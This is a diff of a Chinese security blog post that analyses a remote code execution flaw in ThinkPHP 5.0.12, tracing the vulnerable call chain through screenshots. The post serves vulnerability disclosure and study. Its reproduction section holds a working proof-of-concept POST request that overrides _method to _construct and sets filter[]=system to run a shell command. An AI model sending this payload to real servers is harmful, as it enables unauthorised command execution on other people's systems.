@@ -77,46 +77,41 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <p>有很多网站采用的是ThinkPHP V5.0.12框架，其核心类Requests对变量属性校验不严，可以通过变量覆盖属性并结合框架特性对任意函数调用，实现任意代码执行。</p>
-<h3 id="漏洞分析">漏洞分析</h3>
-<h4 id="代码流程">代码流程</h4>
-<p>首先在开启debug的时候会直接在下面的箭头处触发RCE，这里先关掉debug。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="代码流程"><a href="#代码流程" class="headerlink" title="代码流程"></a>代码流程</h4><p>首先在开启debug的时候会直接在下面的箭头处触发RCE，这里先关掉debug。</p>
 <p><img src="/img/blog_img/tp5/tp5.0.12_01.png" alt=""></p>
 <p>跟进routeCheck()</p>
 <p>这里会调用Route类的check方法：</p>
 <p><img src="/img/blog_img/tp5/tp5.0.12_02.png" alt=""></p>
 <p>继续跟进check方法</p>
 <p>这里会调用Request类的method方法：</p>
-<p><img src="/img/blog_img/tp5/tp5.0.12_03.png" alt=""></p>
+<p><img src="/img/blog_img/tp5/tp5.0.12_03.png" style="zoom:75%;" /></p>
 <p>跟进method方法</p>
 <p>POST可以接收_method参数。根据接收到的参数值调用方法的核心漏洞点就在此：由于没有对参数进行严格限制，可以调用_construct，初始化filter变量。</p>
-<p><img src="/img/blog_img/tp5/tp5.0.12_04.png" alt=""></p>
+<p><img src="/img/blog_img/tp5/tp5.0.12_04.png" style="zoom:75%;" /></p>
 <p>继续跟进_construct方法</p>
 <p><img src="/img/blog_img/tp5/tp5.0.12_05.png" alt=""></p>
 <p>但此处只是设置了filter值，还需要进一步调用。</p>
 <p>最终导致RCE的位置在filterValue中：</p>
 <p><img src="/img/blog_img/tp5/tp5.0.12_06.png" alt=""></p>
 <p>此方法被input()调用，input()又被多个方法进一步调用：</p>
-<p><img src="/img/blog_img/tp5/tp5.0.12_07.png" alt=""></p>
+<p><img src="/img/blog_img/tp5/tp5.0.12_07.png" style="zoom:75%;" /></p>
 <p>若开启debug，1处可以直接触发RCE：</p>
-<p><img src="/img/blog_img/tp5/tp5.0.12_08.png" alt=""></p>
+<p><img src="/img/blog_img/tp5/tp5.0.12_08.png" style="zoom:75%;" /></p>
 <p>未开启debug时，需要进一步跟进exec()。</p>
 <p>此方法中调用了module方法：</p>
-<p><img src="/img/blog_img/tp5/tp5.0.12_09.png" alt=""></p>
+<p><img src="/img/blog_img/tp5/tp5.0.12_09.png" style="zoom:50%;" /></p>
 <p>module方法中会加载控制器：</p>
-<p><img src="/img/blog_img/tp5/tp5.0.12_10.png" alt=""></p>
+<p><img src="/img/blog_img/tp5/tp5.0.12_10.png" style="zoom:75%;" /></p>
 <p>controller会反射一个类：</p>
-<p><img src="/img/blog_img/tp5/tp5.0.12_11.png" alt=""></p>
+<p><img src="/img/blog_img/tp5/tp5.0.12_11.png" style="zoom:75%;" /></p>
 <p>invokeClass()调用bindParams方法：</p>
 <p><img src="/img/blog_img/tp5/tp5.0.12_12.png" alt=""></p>
 <p>最终调用param()触发RCE：</p>
 <p><img src="/img/blog_img/tp5/tp5.0.12_13.png" alt=""></p>
 <p>调用堆栈</p>
 <p><img src="/img/blog_img/tp5/tp5.0.12_14.png" alt=""></p>
-<h3 id="漏洞复现">漏洞复现</h3>
-<h4 id="POC">POC</h4>
-<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line">s=whoami&amp;_method=_construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">system</span></span></span><br></pre></td></tr></table></figure>
-<h4 id="利用">利用</h4>
-<p><img src="/img/blog_img/tp5/tp5.0.12_15.png" alt=""></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line">s=whoami&amp;_method=_construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">system</span></span></span><br></pre></td></tr></table></figure>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p><img src="/img/blog_img/tp5/tp5.0.12_15.png" style="zoom:50%;" /></p>
 
       
     </div>
@@ -185,7 +180,7 @@
           </li>
         
           <li>
-            <a href="../From-The-Very-Beginning/">Restart</a>
+            <a href="../Intro/">Intro</a>
           </li>
         
       </ul>
